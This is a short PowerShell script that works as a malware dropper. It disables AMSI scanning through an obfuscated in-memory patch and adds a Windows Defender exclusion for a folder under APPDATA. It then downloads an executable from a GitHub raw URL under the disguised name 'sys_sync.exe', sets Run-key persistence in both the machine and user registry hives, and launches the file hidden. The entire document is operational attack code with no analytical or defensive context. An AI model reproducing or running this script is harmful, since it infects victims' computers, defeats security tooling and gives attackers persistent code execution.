# Memory patch for bypass
$s = [Ref].Assembly.GetTypes()
foreach($t in $s){if($t.Name -like "*iUt*ls"){$u=$t;break}}
$f = $u.GetField("ams"+"iInit"+"Failed","NonPublic,Static")
$f.SetValue($null,$true)

# Configuration
$b = "$env:APPDATA\Microsoft\Windows\Templates"
$u = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
$k = [uint32]2147483650
$w = [WMIClass]"root\default:StdRegProv"

# Setup folder
if (!(Test-Path $b)) { New-Item -ItemType Directory -Path $b -Force | Out-Null }
powershell -c "Add-MpPreference -ExclusionPath '$b'"

# Download and Persist
$c = New-Object Net.WebClient
$c.DownloadFile($u, "$b\sys_sync.exe")

$r = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
try {
    $w.CreateKey($k, $r)
    $w.SetStringValue($k, $r, "SystemSync", "$b\sys_sync.exe")
} catch {
    # Backup for non-admin
    $k2 = [uint32]2147483649
    $w.CreateKey($k2, $r)
    $w.SetStringValue($k2, $r, "SystemSync", "$b\sys_sync.exe")
}

# Run
Start-Process "$b\sys_sync.exe" -WindowStyle Hidden
